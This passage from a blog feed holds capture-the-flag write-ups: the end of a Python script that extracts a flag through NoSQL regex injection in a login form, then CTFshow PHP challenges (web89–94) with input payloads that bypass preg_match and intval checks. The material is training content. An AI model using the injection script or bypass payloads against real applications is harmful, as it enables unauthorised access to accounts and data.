string\">\"^&#123;&#125;.*$\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>flag<span class=\"token operator\">+</span>ch<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token string\">\"username[$regex]=flag&amp;password[$regex]=\"</span><span class=\"token operator\">+</span>payload</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token comment\">#print(data)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span>proxies<span class=\"token operator\">=</span>proxies<span class=\"token punctuation\">,</span>headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token comment\">#print(r.text)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">r\"\\u767b\\u9646\\u6210\\u529f\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            flag<span class=\"token operator\">=</span>flag<span class=\"token operator\">+</span>ch</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">if</span> ch<span class=\"token operator\">==</span><span class=\"token string\">\"&#125;\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301175801860.png\" alt=\"image-20230301175801860\" /></p>\n",
            "tags": [
                "Web",
                "nosql"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/02/15/php%E7%89%B9%E6%80%A7/",
            "url": "https://blog.xcu.icu/2023/02/15/php%E7%89%B9%E6%80%A7/",
            "title": "CTFshow-web入门php特性",
            "date_published": "2023-02-15T04:00:00.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>勉勉强强算是详解吧</p>\n<h1 id=\"前篇\"><a class=\"anchor\" href=\"#前篇\">#</a> 前篇</h1>\n<h2 id=\"web89\"><a class=\"anchor\" href=\"#web89\">#</a> web89</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$num</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>首先 intval () 函数是用于获取变量的整数值</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230111192534964.png\" alt=\"image-20230111192534964\" /></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$num</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$w</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$w</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$w</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$q</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1a\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$q</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$q</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">echo</span> @<span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">echo</span> @<span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>运行结果</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221107173642929.png\" alt=\"image-20221107173642929\" /></p>\n<p>这里可以看到，当变量为数字时两个函数返回值都是 1，当变量为字母的时候，两个函数返回的都是 0，当变量是字符串的时候，当变量中是由数字的字符串时函数的返回值为 1，但是当变量为数组时，preg_match 的返回值为空而 intval 的返回值为一，所以这里可以使用数组绕过</p>\n<pre><code>/?num[]=1\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221107174022859.png\" alt=\"image-20221107174022859\" /></p>\n<h2 id=\"web90\"><a class=\"anchor\" href=\"#web90\">#</a> web90</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$num</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"4476\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token number\">4476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>根据上面提到的特性，这里直接传进去一个 4476 + 字母即可</p>\n<figure class=\"highlight url\"><figcaption data-lang=\"url\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">num</span>=<span class=\"token value\">4476a</span></span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221107190716542.png\" alt=\"image-20221107190716542\" /></p>\n<h2 id=\"web91\"><a class=\"anchor\" href=\"#web91\">#</a> web91</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^php$/im'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^php$/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'hacker'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'nonononono'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这里是正则的一个小特性，可以去看看我的<a href=\"https://blog.xcu.icu/2022/11/09/preg_match&amp;&amp;%E6%AD%A3%E5%88%99/\"> preg_match&amp;&amp; 正则 - Web | Clown の Blog = (xcu.icu)</a> 这篇文章，绕过这个的方法也不难，第一个是多行匹配，第二个是只匹配一行，且遇到换行返回空</p>\n<pre><code>?cmd=a%0aphp\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221109231302790.png\" alt=\"image-20221109231302790\" /></p>\n<h2 id=\"web92\"><a class=\"anchor\" href=\"#web92\">#</a> web92</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$num</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token operator\">==</span><span class=\"token number\">4476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">4476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>intval 获取变量的整数值，前面又不能相等，但是它又加了一个 0，这里用 e 来构造科学计数法或者写一个小数都行</p>\n<pre><code>?num=4476.1\n?num=4476e1\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221109232250065.png\" alt=\"image-20221109232250065\" /></p>\n<h2 id=\"web93\"><a class=\"anchor\" href=\"#web93\">#</a> web93</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$num</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token operator\">==</span><span class=\"token number\">4476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-z]/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">4476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>不让用字母了，那就用小数点呗</p>\n<pre><code>?num=4476.1\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221109232530653.png\" alt=\"image-20221109232530653\" /></p>\n<p>还能用进制转换</p>\n<pre><code>二进制0bxxx\n八进制0xxxxxx\n十六进制0xaaaa\n</code></pre>\n<p>二进制和十六进制想正常识别都有字母，只有八进制能用了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221109233000924.png\" alt=\"image-20221109233000924\" /></p>\n<h2 id=\"web94\"><a class=\"anchor\" href=\"#web94\">#</a> web94</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$num</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"4476\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-z]/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span 